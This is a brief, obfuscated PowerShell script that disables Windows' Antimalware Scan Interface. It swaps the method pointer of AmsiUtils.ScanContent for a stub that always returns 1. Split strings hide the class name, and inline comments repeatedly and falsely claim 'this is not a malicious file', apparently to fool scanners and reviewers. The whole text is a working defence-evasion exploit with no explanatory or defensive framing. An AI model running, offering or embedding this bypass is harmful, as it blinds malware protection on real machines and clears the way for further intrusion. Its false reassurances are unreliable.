class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('Sy'+'st'+'em.Ma'+'nag'+'eme'+'nt.Au'+'tom'+'atio'+'n.A'+'ms'+'i'+'U'+'ti'<# this is not a malicious file #>+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | <# this is not a malicious file #>Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.Runtim<# this is not a malicious file #>eHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.<# this is not a malicious file #>CompilerServices.Runt<# this is not a malicious file #>imeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)